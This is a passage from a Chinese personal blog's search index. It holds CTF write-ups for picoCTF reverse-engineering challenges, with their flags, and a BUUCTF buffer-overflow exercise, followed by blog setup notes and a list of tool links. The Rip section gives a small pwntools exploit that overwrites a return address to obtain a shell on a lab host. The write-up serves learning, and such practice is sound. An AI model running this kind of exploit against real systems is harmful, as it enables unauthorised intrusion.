src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-134.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-135.png" alt="img"></p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步:"></a>第二步:</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-136.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-137.png" alt="img"></p><p>直接复制出来</p><h3 id="第三步-解密脚本"><a href="#第三步-解密脚本" class="headerlink" title="第三步-解密脚本:"></a>第三步-解密脚本:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-138.png" alt="img"></p><p>这是我们处理后的ASCII码(放在in.txt里)↑</p><p>然后写脚本转换为字符串(注意最开头的34被删了,因为它是字符串的长度),这里我使用c++:</p><p>之所以不使用我最擅长的c是因为c++的STL算法库有reverse函数</p><p>暂时无法在飞书文档外展示此内容</p><p>运行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-139.png" alt="img"></p><p>结束…</p><h2 id="Bbbbloat"><a href="#Bbbbloat" class="headerlink" title="Bbbbloat:"></a>Bbbbloat:</h2><p>直接拖IDA里看main:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-140.png" alt="img"></p><p>直接输549255就行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-141.png" alt="img"></p><p>结束…</p><h2 id="Unpackme"><a href="#Unpackme" class="headerlink" title="Unpackme:"></a>Unpackme:</h2><p>这里提示upx脱壳</p><p>首先扔进DIE里看看,发现有UPX加壳(注意是ELF64—Linux):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-142.png" alt="img"></p><p>所以我们去下载UPX进行脱壳(就是第一个):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-143.png" alt="img"></p><p>免安装,解压后即可使用(xz先解压然后tar解包):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-144.png" alt="img"></p><p>脱壳后再检测发现已经没有壳了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-145.png" alt="img"></p><p>丢进IDA即可(代码一看就懂—第17行):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-146.png" alt="img"></p><p>运行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-147.png" alt="img"></p><p>结束…</p><h2 id="Keygenme"><a href="#Keygenme" class="headerlink" title="Keygenme:"></a>Keygenme:</h2><p>我懂那个意思…运行到字符串比较,然后直接看v14变量就行</p><p>但是我的IDA各种问题无法调试…正在重装…</p><p>装好了…IDA远程调试看看这篇文章:</p><p><a href="https://blog.csdn.net/abc_670/article/details/80066817">远程调试</a></p><p>好现在上题:</p><p>至于IDA里打开就不说了,直接找到main函数里if语句调用的函数,如果发现是类似&amp;func+1这样的就F5重新反编译一下一般就可以了:</p><p>经过分析发现flag存在v17[[32-67]那么直接在v17处理后打断点调试就行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-148.png" alt="img"></p><p> 找到v17,观察(整理)出flag即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-149.png" alt="img"></p><p> picoCTF{br1ng_y0ur_0wn_k3y_9d74d90d}</p><p> 结束…</p><h2 id="Wizardlike"><a href="#Wizardlike" class="headerlink" title="Wizardlike:"></a>Wizardlike:</h2><p>运行一遍一看就是个纯地图</p><p>然后很多地方发现过不去—这不就穿墙挂么~~~</p><p>所以我们IDA吧…别问我怎么找到那个函数的…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-150.png" alt="img"></p><p>没错就是这里↑</p><p>看来是判断是否越界的函数了…(类似我以前写的贪吃蛇的is_over_lap()和againstTheWall()函数):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-151.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-152.png" alt="img"></p><p>好了帮助理解结束了,现在直接把返回的0LL全改成非0就行(之所以没说改成1LL是因为我把小端和大端搞反了—我是菜逼):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-153.png" alt="img"></p><p>然后保存就行,接下来直接跑代码观察地图就行,发现地图的形状就是flag~~</p><p>跑吧~~</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-154.png" alt="img"></p><p> 地图贼反人类…慢慢看吧…</p><p> picoCTF{ur_4_w1z4rd_4844AD6F}</p><p> 好像每个人的地图还不一样…</p><p> 结束…</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN:"></a>PWN:</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc:"></a>test_your_nc:</h2><p> 很简单,运行就知道是获取到shell了</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-155.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-156.png" alt="img"></p><p>但是作为PWN手我们要用正确的解题方式</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-157.png" alt="img"></p><p>丢IDA里F5大法,不用解释</p><p>结束…</p><h2 id="Rip"><a href="#Rip" class="headerlink" title="Rip:"></a>Rip:</h2><h3 id="总体分析"><a href="#总体分析" class="headerlink" title="总体分析:"></a>总体分析:</h3><p>先运行,发现有输入(盲猜gets()),丢IDA吧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-158.png" alt="img"></p><p>好,盲猜正确…接下来该面向google解题了…</p><p>看看有没有其他可利用的函数—&gt;找到了fun():</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-159.png" alt="img"></p><p>于是我们就要想办法跳转到这个函数,从而获得shell入口</p><h3 id="如何构造字符串"><a href="#如何构造字符串" class="headerlink" title="如何构造字符串:"></a>如何构造字符串:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-160.png" alt="img"></p><p>可以发现s变量占15字节(反编译也能看出来char s[15])</p><p>现在问题来了,我们要知道栈溢出的细节:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-161.png" alt="img"></p><p>用DIE工具查看该文件,发现是ELF64(废话),那么针对ELF64的分析如下:</p><p><a href="https://blog.csdn.net/weixin_43780092/article/details/126694251">基础知识可以看看这篇文章</a></p><p>因为本蒟蒻只会一点8086,所以也就大致先看看,有个概念再说…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-162.png" alt="img"></p><p>其实重点就是这张图↑</p><h3 id="对栈帧的分析-也就是分析上图"><a href="#对栈帧的分析-也就是分析上图" class="headerlink" title="对栈帧的分析(也就是分析上图):"></a>对栈帧的分析(也就是分析上图):</h3><p> 首先要知道对于函数栈帧来讲,也就是对于堆栈而言,是从高地址向低地址分配的(所以对s的溢出会影响到上一个函数栈帧—我理解的应该没错)</p><p> 那么我们要进行计算,首先是15字节的s数组,以任意值进行填充,然后是填充当前函数帧的ebp(对于ELF64而言,且其占用8字节—因为是64位机器),此时我们就有15+8&#x3D;&#x3D;23字节了</p><p> 接下来就是我们实际要覆盖的返回地址了,这里在IDA找到fun()函数的地址(0x401186)</p><p> 于是我们在python中写exp(我的环境在linux安装,所以在linux下编写)—我也不知道我啥时候装的环境</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-163.png" alt="img"></p><p> 代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29939</span>) <span class="comment">#靶机地址和端口</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">15</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>).decode(<span class="string">&quot;iso-8859-1&quot;</span>)</span><br><span class="line"><span class="comment">#char s的15个字节+RBP的8字节+fun函数入口地址，+1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p> 运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-164.png" alt="img"></p><h3 id="问题来了"><a href="#问题来了" class="headerlink" title="问题来了:"></a>问题来了:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-165.png" alt="img"></p><p>  是的没错,玄学,这个问题先放在这里吧,暂时搞不了…(哪天回头再看看吧,有地方没理解到位)</p><p>  而且那个堆栈平衡以后也得仔细看看…</p><p>​      勉强算是结束了吧…</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客文档建立日志</title>
      <link href="/2023-06-02-54d71795c077/"/>
      <url>/2023-06-02-54d71795c077/</url>
      
        <content type="html"><![CDATA[<h2 id="markdown文件-YAML-Front-Matter-快捷信息备份"><a href="#markdown文件-YAML-Front-Matter-快捷信息备份" class="headerlink" title="markdown文件 YAML Front Matter 快捷信息备份"></a>markdown文件 YAML Front Matter 快捷信息备份</h2><p>2023.07.27</p><table><thead><tr><th align="left">写法</th><th>解释</th></tr></thead><tbody><tr><td align="left">title</td><td>【必需】文章标题</td></tr><tr><td align="left">date</td><td>【必需】文章创建日期(实际博客网页会自动同步,可以不加)</td></tr><tr><td align="left">updated</td><td>【可选】文章更新日期</td></tr><tr><td align="left">tags</td><td>【可选】文章标签</td></tr><tr><td align="left">categories</td><td>【可选】文章分类</td></tr><tr><td align="left">keywords</td><td>【可选】文章关键字</td></tr><tr><td align="left">description</td><td>【可选】文章描述</td></tr></tbody></table><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="图床搭建"><a href="#图床搭建" class="headerlink" title="图床搭建"></a>图床搭建</h2><p>2023.07.27</p><p>使用PicGo+阿里云OSS搭建:</p><p>typora测试PicGo app失败,但是后续测试发现成功</p><h3 id="关键报错问题"><a href="#关键报错问题" class="headerlink" title="关键报错问题:"></a>关键报错问题:</h3><p>​从飞书复制下来的markdown中的图片会上传失败,报错信息:</p><p>​No mime type found for file asynccode</p><p>​解决方案:</p><p>​暂未有直接的解决办法</p><p>​间接解决办法:</p><p>​将typora图片设置为自动保存到某个路径,从而自动生成图片路径为本地的一篇markdown,然后重新改回上传图片,将本地图片全部上传即可解决当前篇博客的图片问题.但是意味着不能每次从飞书这样操作,否则会非常麻烦.</p><h2 id="评论系统配置"><a href="#评论系统配置" class="headerlink" title="评论系统配置"></a>评论系统配置</h2><p>2023.07.28</p><p>基于Twikoo评论系统,使用zeabur部署:</p><p>1.将github上Twikoo的仓库fork到自己的github中</p><p>2.配置zeabur服务</p><p>3.在Hexo框架中(butterfly主题支持该评论系统)对zeabur生成的域名进行连接</p><p>4.成功,部署到网站</p><p>2023.08.04</p><p>1.配置新评论邮箱提醒</p><p>2.配置Navicat16连接到评论数据库(MongoDB),可以进行评论的后台管理</p><h2 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h2><p>添加本地搜索插件—hexo-generator-search</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装插件:</span></span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局_config.yml中添加:</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 主题_config.yml中设置:</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#注:template配置，无需配置该项,配置了反而无法正常搜索</span></span><br></pre></td></tr></table></figure><h2 id="网址备份"><a href="#网址备份" class="headerlink" title="网址备份"></a>网址备份</h2><h3 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h3><p>Twikoo:<a href="https://twikoo.js.org/">https://twikoo.js.org/</a></p><p>zeabur:<a href="https://dash.zeabur.com/projects">https://dash.zeabur.com/projects</a></p><h3 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h3><p>阿里云OSS:<a href="https://account.aliyun.com/login/login.htm?oauth_callback=https://oss.console.aliyun.com/index?path=img/">https://account.aliyun.com/login/login.htm?oauth_callback=https://oss.console.aliyun.com/index?path=img%2F</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类导航</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<p>hello world</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.baidu.com/">https://www.baidu.com</a></p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/json-data/tools.json"/>
      <url>/json-data/tools.json</url>
      
        <content type="html"><![CDATA[[{"class_name":"CTF工具","class_desc":"常用在线工具","link_list":[{"name":"CyberChef","link":"https://icyberchef.com/","avatar":"/img/artical_pic.png","descr":"编码万能转换"},{"name":"密码破解","link":"http://www.atoolbox.net/Category.php?Id=27&Page=1","avatar":"/img/artical_pic.png","descr":"基本密码在线解密"},{"name":"正则表达式工具","link":"https://c.runoob.com/front-end/854/?optionGlobl=global","avatar":"/img/artical_pic.png","descr":"正则表达式在线处理"},{"name":"BrainF**k and Ook","link":"https://www.splitbrain.org/services/ook","avatar":"/img/artical_pic.png","descr":"某种玄学的东西"},{"name":"因数分解","link":"http://www.factordb.com/index.php","avatar":"/img/artical_pic.png","descr":"一个因数分解数据库"},{"name":"摩斯电码","link":"https://morsecode.world/international/decoder/audio-decoder-adaptive.html","avatar":"/img/artical_pic.png","descr":"不解释"},{"name":"图像处理","link":"https://onlinetools.com/image","avatar":"/img/artical_pic.png","descr":"图像的各种特殊处理"},{"name":"Java在线逆向","link":"http://javare.cn","avatar":"/img/artical_pic.png","descr":"可以class文件..."},{"name":"Awesome-Hacking","link":"https://blog.csdn.net/ZYC88888/article/details/113663486","avatar":"/img/artical_pic.png","descr":"CTF工具库"}]},{"class_name":"转换工具","class_desc":"格式转换的一些小工具","link_list":[{"name":"pdf转换工具","link":"https://www.alltoall.net/","avatar":"/img/artical_pic.png","descr":"文档在线转换"},{"name":"音频格式转换工具","link":"http://ncm.miidj.com/","avatar":"/img/artical_pic.png","descr":"方便使用播放器"},{"name":"操作系统文件格式转换","link":"http://tools.bugscaner.com/text/textconvert.html","avatar":"/img/artical_pic.png","descr":"在线文档格式windows unix macintosh互相转换"}]},{"class_name":"网络工具","class_desc":"网络相关的工具和资源","link_list":[{"name":"测速网","link":"https://www.speedtest.cn/","avatar":"/img/artical_pic.png","descr":"网速测试"},{"name":"Clash","link":"https://github.com/Dreamacro/clash/releases","avatar":"/img/artical_pic.png","descr":"Clash下载直达"},{"name":"虚拟手机号","link":"https://sms-activate.org/cn/getNumber","avatar":"/img/artical_pic.png","descr":"虚拟手机号服务"},{"name":"机场","link":"https://www.mojie.mx/#/login","avatar":"/img/artical_pic.png","descr":"懂?"}]},{"class_name":"其他工具","class_desc":"其他各种工具","link_list":[{"name":"文本对比工具","link":"https://tool.p2hp.com/tool-online-difftext/","avatar":"/img/artical_pic.png","descr":"在线文本对比"},{"name":"大数运算器","link":"https://goodcalculators.com/big-number-calculator/","avatar":"/img/artical_pic.png","descr":"高精度大数在线运算"},{"name":"阶乘运算器","link":"https://zh.numberempire.com/factorialcalculator.php","avatar":"/img/artical_pic.png","descr":"阶乘计算"}]}]]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的影子</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<p>hello world</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>在线工具</title>
      <link href="/tools/index.html"/>
      <url>/tools/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
